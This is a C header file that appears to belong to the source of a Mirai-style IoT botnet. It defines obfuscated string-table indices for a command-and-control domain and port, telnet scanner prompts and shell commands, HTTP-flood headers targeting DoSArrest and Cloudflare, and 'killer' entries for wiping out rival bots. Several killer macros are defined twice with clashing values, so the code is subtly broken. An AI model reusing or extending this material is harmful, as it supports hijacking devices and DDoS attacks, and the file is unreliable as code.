#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4               
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8
#define TABLE_KILLER_FD                 9
#define TABLE_KILLER_ANIME              10
#define TABLE_KILLER_STATUS             11     

#define TABLE_SCAN_CB_DOMAIN            12
#define TABLE_SCAN_CB_PORT              13
#define TABLE_SCAN_SHELL                14
#define TABLE_SCAN_ENABLE               15
#define TABLE_SCAN_SYSTEM               16
#define TABLE_SCAN_SH                   17
#define TABLE_SCAN_QUERY                18
#define TABLE_SCAN_RESP                 19
#define TABLE_SCAN_NCORRECT             20
#define TABLE_SCAN_PS                   21
#define TABLE_SCAN_KILL_9               22    

#define TABLE_ATK_VSE                   23
#define TABLE_ATK_RESOLVER              24
#define TABLE_ATK_NSERV                 25
#define TABLE_ATK_KEEP_ALIVE            26
#define TABLE_ATK_ACCEPT                27
#define TABLE_ATK_ACCEPT_LNG            28
#define TABLE_ATK_CONTENT_TYPE          29
#define TABLE_ATK_SET_COOKIE            30
#define TABLE_ATK_REFRESH_HDR           31
#define TABLE_ATK_LOCATION_HDR          32
#define TABLE_ATK_SET_COOKIE_HDR        33
#define TABLE_ATK_CONTENT_LENGTH_HDR    34
#define TABLE_ATK_TRANSFER_ENCODING_HDR 35
#define TABLE_ATK_CHUNKED               36
#define TABLE_ATK_KEEP_ALIVE_HDR        37
#define TABLE_ATK_CONNECTION_HDR        38
#define TABLE_ATK_DOSARREST             40
#define TABLE_ATK_CLOUDFLARE_NGINX      41

#define TABLE_HTTP_1                  	42
#define TABLE_HTTP_2                  	43
#define TABLE_HTTP_3                	44
#define TABLE_HTTP_4                 	45 
#define TABLE_HTTP_5                 	46
#define TABLE_HTTP_6                 	47
#define TABLE_HTTP_7                 	48
#define TABLE_HTTP_8                 	49
#define TABLE_HTTP_9                 	50
#define TABLE_HTTP_10                 	51
#define TABLE_HTTP_11                 	52
#define TABLE_HTTP_12                 	53
#define TABLE_HTTP_13                 	54
#define TABLE_HTTP_14                 	55
#define TABLE_HTTP_15                 	56

#define TABLE_MISC_WATCHDOG				57
#define TABLE_MISC_WATCHDOG2			58
#define TABLE_SCAN_ASSWORD				59
#define TABLE_SCAN_OGIN					60
#define TABLE_SCAN_ENTER				61
#define TABLE_MISC_RAND					62

#define TABLE_KILLER_SAFE               63
#define TABLE_KILLER_PROC               64
#define TABLE_KILLER_EXE                65
#define TABLE_KILLER_DELETED            66 
#define TABLE_KILLER_FD                 67 
#define TABLE_KILLER_ANIME              68 
#define TABLE_KILLER_STATUS             69

#define TABLE_KILLER_DEMON				70
#define TABLE_KILLER_HOHO				71
#define TABLE_KILLER_OMNI				72		
#define TABLE_KILLER_ZAPON				73		

#define TABLE_MAX_KEYS  				74

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
